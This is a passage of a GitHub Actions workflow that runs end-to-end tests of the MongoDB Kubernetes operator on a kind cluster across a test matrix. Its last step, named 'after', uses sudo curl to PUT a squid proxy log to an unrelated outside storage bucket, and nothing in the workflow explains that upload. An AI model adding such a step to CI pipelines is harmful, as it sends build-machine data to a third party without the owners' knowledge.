        ref: ${{github.event.pull_request.head.sha}}
        repository: ${{github.event.pull_request.head.repo.full_name}}
        submodules: true
    - continue-on-error: true
      name: Set default run status
      run: echo "::set-output name=last_run_status::pending" > last_run_status
    - continue-on-error: true
      id: last_run
      name: Restore last run status
      uses: actions/cache@v2
      with:
        key: ${{ github.run_id }}-${{ matrix.test-name }}-${{ matrix.distro }}
        path: last_run_status
    - continue-on-error: true
      id: last_run_status
      name: Set last run status
      run: cat last_run_status
    - continue-on-error: true
      name: Setup Python
      uses: actions/setup-python@v2
      with:
        python-version: 3.10.4
    - continue-on-error: true
      name: Cache Dependencies
      uses: actions/cache@v2
      with:
        key: ${{ hashFiles('requirements.txt') }}
        path: ~/.cache/pip
    - continue-on-error: true
      name: Install Python Dependencies
      run: pip install -r requirements.txt
    - continue-on-error: true
      if: steps.last_run_status.outputs.last_run_status != 'success'
      name: Setup Kind Cluster
      run: 'curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.11.1/kind-linux-amd64

        chmod +x ./kind

        ./kind create cluster

        '
    - continue-on-error: true
      if: steps.last_run_status.outputs.last_run_status != 'success'
      name: Create Directories
      run: 'docker exec kind-control-plane  mkdir -p /opt/data/mongo-data-0 /opt/data/mongo-data-1
        /opt/data/mongo-data-2 /opt/data/mongo-logs-0 /opt/data/mongo-logs-1 /opt/data/mongo-logs-2

        '
    - continue-on-error: true
      if: steps.last_run_status.outputs.last_run_status != 'success'
      name: Install CRD
      run: kubectl apply -f config/crd/bases/mongodbcommunity.mongodb.com_mongodbcommunity.yaml
    - continue-on-error: true
      id: e2e_test
      if: steps.last_run_status.outputs.last_run_status != 'success'
      name: Run Test
      run: "cluster_wide=${{ matrix.cluster-wide }}\nif [ -z \"$cluster_wide\" ];\
        \ then\n  cluster_wide=\"false\"\nfi\npython3 ./scripts/dev/e2e.py --test\
        \ ${{ matrix.test-name }} --tag ${{ github.run_id }} --config_file ./scripts/ci/config.json\
        \ --distro ${{ matrix.distro }} --cluster-wide ${cluster_wide}\n"
    - continue-on-error: true
      if: always()
      name: Save run status
      run: echo "::set-output name=last_run_status::${{ steps.e2e_test.outcome }}"
        > last_run_status
    - continue-on-error: true
      id: dump_diagnostics
      if: always() && steps.e2e_test.outcome == 'failure'
      name: Dump Diagnostics
      run: scripts/ci/dump_diagnostics.sh default
    - continue-on-error: true
      if: always() && steps.dump_diagnostics.outcome == 'success'
      name: Upload Diagnostics
      uses: actions/upload-artifact@v4
      with:
        name: ${{ matrix.test-name }}-${{ matrix.distro }}-diagnostics
        path: ${{ github.workspace }}/diagnostics
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/mongodb/mongodb-kubernetes-operator.$(date
        +%s)
    strategy:
      fail-fast: false
      matrix:
        include:
        - distro: ubi
          test-name: replica_set
        - distro: ubi
          test-name: replica_set_enterprise_upgrade_4_5
        - distro: ubi
          test-name: replica_set_enterprise_upgrade_5_6
        - distro: ubi
